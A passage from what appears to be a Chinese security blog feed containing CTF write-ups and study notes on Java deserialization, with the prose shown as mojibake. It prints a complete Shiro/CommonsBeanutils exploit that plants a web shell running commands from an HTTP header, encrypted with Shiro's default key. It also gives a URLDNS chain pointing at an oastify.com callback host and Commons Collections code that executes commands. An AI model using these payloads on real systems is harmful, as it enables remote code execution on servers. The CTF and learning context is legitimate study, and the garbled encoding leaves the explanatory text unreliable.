class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalPoc2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> getTemplate();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br>        <span class="hljs-comment">//serialize(priorityQueue);</span><br>        <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);</span><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] key = java.util.Base64.getDecoder().decode(CodecSupport.toBytes(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));<span class="hljs-comment">//shiroé»˜è®¤å¯†é’¥</span><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        System.out.println(aes.encrypt(bytes, key));<br>    &#125;<br>    <span class="hljs-comment">/*    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="hljs-comment">            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="hljs-comment">            oos.writeObject(obj);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;</span><br><span class="hljs-comment">            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="hljs-comment">            Object obj = ois.readObject();</span><br><span class="hljs-comment">            return obj;</span><br><span class="hljs-comment">        &#125;*/</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass <span class="hljs-title function_">genPayloadForLinux2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public spring() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br>        <span class="hljs-comment">// å…¼å®¹ä½ç‰ˆæœ¬jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TemplatesImpl <span class="hljs-title function_">getTemplate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> genPayloadForLinux2();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clz.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œå‘½ä»¤å°±è¡Œï¼š</p><p><img src="/img/polaroa_18.png" alt="polaroa_18"></p><h3 id="0x03ç»“è¯­"><a href="#0x03ç»“è¯­" class="headerlink" title="0x03ç»“è¯­"></a>0x03ç»“è¯­</h3><p>ğŸ˜Ÿjavaå­¦ä¹ ä»»é‡è€Œé“è¿œ</p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨åˆæ¢_CCé“¾ç¬”è®°</title>
    <link href="/2024/04/27/BUUCTF10/"/>
    <url>/2024/04/27/BUUCTF10/</url>
    
    <content type="html"><![CDATA[<p>ä¸€äº›javaååºåˆ—åŒ–ç›¸å…³çš„å­¦ä¹ ç¬”è®°</p><span id="more"></span><p>å‚è€ƒäº†æŒºå¤šå¸ˆå‚…çš„æ–‡ç« ğŸ˜€è¿™é‡Œåªåšç®€å•æ•´ç†ï¼Œè¯¦ç»†å†…å®¹æ¨èè¿™ä½å¸ˆå‚…ï¼š</p><p><a href="https://drun1baby.top/">Java</a></p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>è°ƒç”¨é¡ºåºï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">readObject</span> -&gt;</span><br>  H<span class="hljs-function"><span class="hljs-title">ashMap</span>.putVal -&gt;</span><br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash -&gt;</span><br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">hashCode</span>() -&gt;</span><br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>getHostAddress()<br></code></pre></td></tr></table></figure><p>ç®€å•è·Ÿä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//çœç•¥ä¸€äº›</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">//--------------------------------------------------------</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-comment">//æ³¨æ„è¿™ä¸ªkey</span><br><span class="hljs-comment">//---------------------------------------------------------</span><br><span class="hljs-comment">//URL.java</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br><span class="hljs-comment">//----------------------------------------------------------</span><br><span class="hljs-keyword">transient</span> URLStreamHandler handler;<br><span class="hljs-comment">//----------------------------------------------------------</span><br><span class="hljs-comment">//URLStreamHandler.java</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br><span class="hljs-comment">//getHostAddress</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> u.hostAddress;<br></code></pre></td></tr></table></figure><p><code>put</code>æ–¹æ³•é‡Œçš„<code>key</code>æ”¾ä¸ªURLï¼Œ<code>put</code>è§¦å‘åŒç±»ä¸‹çš„<code>hash</code>æ–¹æ³•<code>hash</code>æ–¹æ³•è§¦å‘åŒç±»ä¸‹çš„<code>key.hashcode</code>ï¼Œç°åœ¨è¿™ä¸ªkeyæ˜¯URLç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚å…¶å®å°±æ˜¯è°ƒç”¨äº†<code>URL.java</code>ä¸‹çš„<code>hashCode</code>æ–¹æ³•ã€‚<code>hashCode(this)</code>è¿™é‡Œçš„<code>this</code>æ˜¯è°ƒç”¨è¯¥<code>hashCode</code>æ–¹æ³•çš„å¯¹è±¡æœ¬èº«ï¼Œå°±æ˜¯åˆšæ‰é‚£ä¸ªURLå®ä¾‹ã€‚æœ€ç»ˆè°ƒç”¨<code>getHostAddress</code>å‘èµ·ä¸€ä¸ªDNSè¯·æ±‚ã€‚</p><p>åˆæ­¥<code>EXP</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();   <br>hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;dnslogç”Ÿæˆçš„URL&quot;</span>),<span class="hljs-number">1</span>);<br><br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>è¿™æ—¶ä¼šå‘ç°<code>put</code>çš„æ—¶å€™å°±èƒ½å‘èµ·DNSæŸ¥è¯¢ï¼Œè€Œä¸æ˜¯ååºåˆ—åŒ–ï¼Œé—®é¢˜å‡ºåœ¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//HashMap.java</span><br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>      <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>  &#125;<br><span class="hljs-comment">//URL.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>          <span class="hljs-keyword">return</span> hashCode;<br><br>      hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>      <span class="hljs-keyword">return</span> hashCode;<br>  &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¦‚æœ<code>hashCode</code>ä¸ç­‰äº-1çš„è¯å°±ä¼šèµ°æˆ‘ä¸Šé¢å†™é‚£æ®µé“¾å­(è€Œä¸€å¼€å§‹å®šä¹‰<code> HashMap</code> ç±»çš„æ—¶å€™<code>hashCode</code>çš„åˆå§‹å€¼å°±æ˜¯-1ï¼Œç›¸å½“äºæˆ‘ä»¬åˆ©ç”¨<code>put</code>é‡Œçš„<code>hash</code>åšå¼€å¤´èµ°å®Œäº†è¿™æ¡é“¾å­ï¼Œè€Œä¸æ˜¯åˆ©ç”¨<code>readObject</code>é‡Œçš„hash)ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦é€šè¿‡åå°„ï¼Œç›®çš„æ˜¯putæ—¶hashcodeä¸ç­‰äº-1ï¼Œååºåˆ—åŒ–æ—¶ç­‰äº-1ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br> <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);  <br> HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();  <br> <span class="hljs-comment">// è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚  </span><br> <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>); <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br> hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br> hashcodefile.set(url,<span class="hljs-number">1234</span>);<span class="hljs-comment">//è¿™é‡Œåªè¦ä¸æ˜¯-1å°±è¡Œ</span><br> hashmap.put(url,<span class="hljs-number">1</span>);  <br> <span class="hljs-comment">// è¿™é‡ŒæŠŠ hashCode æ”¹ä¸º -1ï¼› é€šè¿‡åå°„çš„æŠ€æœ¯æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§  </span><br> hashcodefile.set(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">//è¿™é‡Œæ”¹æˆ-1ï¼Œè§¦å‘hashCodeä¸‹çš„handler.hashCode(this);</span><br> serialize(hashmap);  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>åˆæ­¥å†™ä¸€ä¸‹è°ƒç”¨é¡ºåºï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Invokertransformer.transform -&gt;<br>   <span class="hljs-function"><span class="hljs-params">(TransformedMap.java)</span>-&gt;</span>checksetvalueæ–¹æ³•<br>  (TransformedMap.java)valueTransformer.transform -&gt;<br><span class="hljs-function"><span class="hljs-params">(TransformedMap.javaçš„æ„é€ å‡½æ•°)</span> -&gt;</span>å®šä¹‰äº†è¿™ä¸ªvalueTransformerï¼Œä½†æ„é€ æ–¹æ³•çš„ä½œç”¨åŸŸæ˜¯protectedï¼Œè¦æƒ³åŠæ³•æ‰¾åˆ«çš„æ–¹æ³•å»è°ƒç”¨è¿™ä¸ªæ„é€ æ–¹æ³•ä»è€Œè®©è¿™ä¸ªvalueTransformerå¯æ§<br>(è¿™é‡Œæ‰¾åˆ°äº†åŒç±»ä¸‹çš„decorateæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œç›´æ¥<span class="hljs-keyword">new</span>äº†ä¸€ä¸ªTransformedMapå¯¹è±¡ï¼Œéƒ½å®ä¾‹åŒ–å¯¹è±¡äº†è‚¯å®šä¼šè°ƒç”¨å®ƒçš„æ„é€ æ–¹æ³•)<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹å°±æ˜¯è¿™ä¸ª<code>Invokertransformer</code>ä¸‹çš„<code>transform</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//InvokerTransformer.java</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br><span class="hljs-comment">//çœ‹ä¸‹è¿™äº›å‚æ•°ï¼š</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸¤ä¸ªä¸œè¥¿å¼¹ä¸ªè®¡ç®—å™¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;  <br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> invokerTransformer.transform(runtime);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯ä¿®æ”¹äº†åˆ©ç”¨åå°„å¼¹è®¡ç®—å™¨çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.omg.SendingContext.RunTime;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br> method.setAccessible(<span class="hljs-literal">true</span>);  <br> method.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå¯»æ‰¾åŒåå‡½æ•°çš„ä¸åŒè°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformedMap.javaä¸‹å­˜åœ¨</span><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸ª<code>checkSetValue</code>æ–¹æ³•ï¼å…¶å®å°±æ˜¯æŠŠ<code>invokertransformer</code>æ¢æˆäº†<code>valueTransformer</code>ï¼Œç„¶å<code>value</code>æ”¾ä¸ªå®ä¾‹åŒ–åçš„<code>Runtime</code>ã€‚çœ‹çœ‹è¿™ä¸œè¥¿èƒ½å¦å®Œç¾æ›¿æ¢<code>invokertransformer</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ„é€ å‡½æ•°</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span 